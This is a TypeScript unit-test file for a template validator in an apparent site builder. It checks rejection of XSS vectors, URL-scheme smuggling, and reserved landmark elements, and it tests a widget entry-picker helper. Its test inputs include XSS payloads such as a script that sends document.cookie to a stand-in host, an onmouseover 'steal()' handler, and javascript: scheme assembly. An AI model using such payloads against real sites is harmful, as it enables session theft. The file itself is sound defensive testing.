  it('points at the bad interpolation’s position (not the start of the file)', () => {
    const e = (() => {
      try {
        validateTemplate('<a\n  href="{{ page.link }}">x</a>');
        return null;
      } catch (err) {
        return err as TemplateError;
      }
    })();
    expect(e?.line).toBe(2); // the href interpolation is on line 2
    expect(e?.message).toMatch(/\(line 2, column \d+\)/);
  });

  it('rejects interpolation in an unquoted attribute', () => {
    rejects('<div class={{ dataset.cls }}>x</div>');
  });

  it('rejects interpolation in event-handler and style attributes', () => {
    rejects('<button onclick="{{ dataset.x }}">x</button>');
    rejects('<div style="color:{{ dataset.c }}">x</div>');
  });

  it('rejects interpolation in <script>, <style>, and HTML comments', () => {
    rejects('<script>var x = {{ dataset.x }};</script>');
    rejects('<style>.a { color: {{ dataset.c }} }</style>');
    rejects('<!-- {{ page.title }} -->');
  });

  it('requires {{sw-url …}} (not a bare value) inside URL attributes', () => {
    rejects('<a href="{{ page.link }}">x</a>');
    allows('<a href="{{sw-url page.link}}">x</a>');
    allows('<a href="/p/{{ page.slug }}">x</a>'); // literal prefix fixes the scheme → allowed
  });

  it('gates the lazy-load data-src / data-bg URL attributes like src / background', () => {
    // The runtime swaps these into src / background-image, so an interpolated value (often
    // lower-trust data) must be scheme-fixed — same rule as src.
    rejects('<img data-src="{{ page.img }}" alt="x">');
    allows('<img data-src="{{sw-url page.img}}" alt="x">');
    allows('<img data-src="/media/x.jpg" alt="x">'); // literal safe prefix
    rejects('<div data-bg="{{ page.img }}"></div>');
    allows('<div data-bg="{{sw-url page.img}}"></div>');
    allows('<div data-bg="/media/x.jpg"></div>'); // literal safe prefix for data-bg too
    allows('<iframe data-src="{{sw-url page.embed}}" title="m"></iframe>'); // iframes too
    // An unsafe literal prefix can't smuggle a scheme past the interpolation (same as href).
    rejects('<img data-src="j{{ page.rest }}" alt="x">'); // → javascript:
    rejects('<div data-bg="//{{ page.host }}"></div>'); // protocol-relative
  });

  it('does NOT gate data-srcset or other data-* (only data-src/data-bg join the URL set)', () => {
    allows('<img data-srcset="{{ page.srcset }}" alt="x">'); // mirrors plain srcset — image-fetch only
    allows('<div data-sw-text="{{ dataset.v }}"></div>'); // editor directive attr — unaffected
    allows('<div data-aos="{{ dataset.fx }}"></div>'); // animation attr — unaffected
  });

  it('allows interpolation in element text and quoted non-URL attributes', () => {
    allows('<p data-x="{{ dataset.v }}">{{ dataset.v }}</p>');
    allows('{{#each dataset.products}}<span>{{name}}</span>{{/each}}'); // block tags are not output mustaches
  });

  it('renderTemplate runs the validator (rejects an unsafe template before rendering)', () => {
    expect(() => renderTemplate('<div class={{ dataset.cls }}>x</div>', ctx)).toThrow(TemplateError);
  });
});

describe('validateTemplate — no tenant JS + URL scheme (security-review fixes)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('rejects a <script> element even with no interpolation', () => {
    rejects('<p>hi</p><script>alert(1)</script>');
  });

  it('rejects a <script> hidden inside an {{#*inline}} partial body (the inline-partial bypass)', () => {
    rejects('{{#*inline "x"}}<script>fetch("//e/"+document.cookie)</script>{{/inline}}{{> x}}');
  });

  it('rejects inline on* event-handler attributes (literal or interpolated)', () => {
    rejects('<div onmouseover="steal()">x</div>');
    rejects('<button onclick="{{ dataset.x }}">x</button>');
  });

  it('rejects a URL whose scheme a bare literal prefix does NOT fix', () => {
    rejects('<a href="j{{ dataset.rest }}">x</a>'); // assembles javascript:
    rejects('<a href="//{{ dataset.host }}">x</a>'); // protocol-relative
    rejects('<img src="data:{{ dataset.b64 }}">'); // data: scheme
  });

  it('still allows safe URL prefixes and the {{sw-url}} helper', () => {
    allows('<a href="/p/{{ page.slug }}">x</a>');
    allows('<a href="https://x.test/{{ page.slug }}">x</a>');
    allows('<a href="#{{ page.frag }}">x</a>');
    allows('<a href="{{sw-url page.link}}">x</a>');
  });

  it('neuters the {{log}} helper (no stdout disclosure)', () => {
    // log is unregistered → {{log x}} no longer writes the value to stdout; it errors instead.
    expect(() => renderTemplate('{{log company.name}}', { company: { name: 'Acme' } })).toThrow(TemplateError);
  });
});

describe('validateTemplate — skeleton-owned semantic landmarks are reserved', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('rejects each landmark element the skeleton declares (<nav>/<main>/<footer>/<aside>)', () => {
    rejects('<nav class="navbar">x</nav>');
    rejects('<main class="p-4">x</main>');
    rejects('<footer>x</footer>');
    rejects('<aside>x</aside>');
  });

  it('rejects a landmark hidden inside an {{#*inline}} partial body too', () => {
    rejects('{{#*inline "f"}}<footer>x</footer>{{/inline}}{{> f}}');
  });

  it('the error names the element and points at the reserved id + a fix', () => {
    expect(() => validateTemplate('<nav>x</nav>')).toThrow(/<nav> element is not allowed.*top-nav.*<div>/s);
    expect(() => validateTemplate('<main>x</main>')).toThrow(/<main>.*page-content/s);
    expect(() => validateTemplate('<footer>x</footer>')).toThrow(/<footer>.*id="footer".*<div>/s);
    expect(() => validateTemplate('<aside>x</aside>')).toThrow(/<aside>.*sidebar-left/s);
  });

  it('allows neutral wrappers and non-reserved semantic elements (<section>/<article>/<header>/<ul>)', () => {
    allows('<div class="footer">x</div>');
    allows('<section><h1>{{ page.title }}</h1></section>');
    allows('<article class="prose">x</article>');
    allows('<header class="hero">x</header>'); // <header> is NOT a skeleton landmark
    allows('<ul class="menu"><li><a href="/">Home</a></li></ul>');
  });

  it('does not false-match a tag whose name merely starts with a landmark (<navbar>/<mainframe>)', () => {
    allows('<navbar>x</navbar>');
    allows('<mainframe>x</mainframe>');
  });
});

describe('{{sw-pick-entry}} (Widget config selector)', () => {
  const pick = (sel: string, hero: unknown) =>
    renderTemplate('{{#with (sw-pick-entry dataset.hero @root.page.data.pick)}}[{{label}}]{{/with}}', {
      dataset: { hero },
      page: { data: sel ? { pick: sel } : {} },
    } as TemplateContext);

  const envelopes = [
    { id: 'a', dataset: 'hero', values: { label: 'Alpha' } },
    { id: 'b', dataset: 'hero', values: { label: 'Beta' } },
  ];

  it('selects the entry whose id matches the page.data pointer', () => {
    expect(pick('b', envelopes)).toBe('[Beta]');
  });
  it('defaults to the first entry when the pointer is unset or unknown', () => {
    expect(pick('', envelopes)).toBe('[Alpha]');
    expect(pick('zzz', envelopes)).toBe('[Alpha]');
  });
  it('renders nothing for an empty/absent dataset', () => {
    expect(pick('a', [])).toBe('');
    expect(pick('a', undefined)).toBe('');
  });
  it('accepts a plain values array too (returns the element as-is)', () => {
    expect(pick('', [{ label: 'Plain' }])).toBe('[Plain]');
  });

  // BLOCK form: renders the block with the chosen entry's values; in PREVIEW wraps in a data-sw-entry
  // marker so a click opens that entry; @entry exposes the envelope id.
  const block = (markEntries: boolean) =>
    renderTemplate('{{#sw-pick-entry dataset.hero @root.page.data.pick}}<i>{{label}} {{@entry.id}}</i>{{else}}EMPTY{{/sw-pick-entry}}', {
      dataset: { hero: envelopes },
      page: { data: { pick: 'b' } },
      markEntries,
    } as TemplateContext);

  it('block form renders the chosen entry + exposes @entry.id', () => {
    expect(block(false)).toBe('<i>Beta b</i>'); // publish: no wrapper
  });
  it('block form wraps in a data-sw-entry marker in PREVIEW (markEntries)', () => {
    const out = block(true);
    expect(out).toContain('data-sw-entry="b"');
    expect(out).toContain('data-sw-dataset="hero"');
    expect(out).toContain('<i>Beta b</i>');
  });
  it('block form routes an empty dataset to {{else}}', () => {
    expect(renderTemplate('{{#sw-pick-entry dataset.hero @root.page.data.pick}}X{{else}}EMPTY{{/sw-pick-entry}}', { dataset: { hero: [] } } as TemplateContext)).toBe('EMPTY');
  });
});
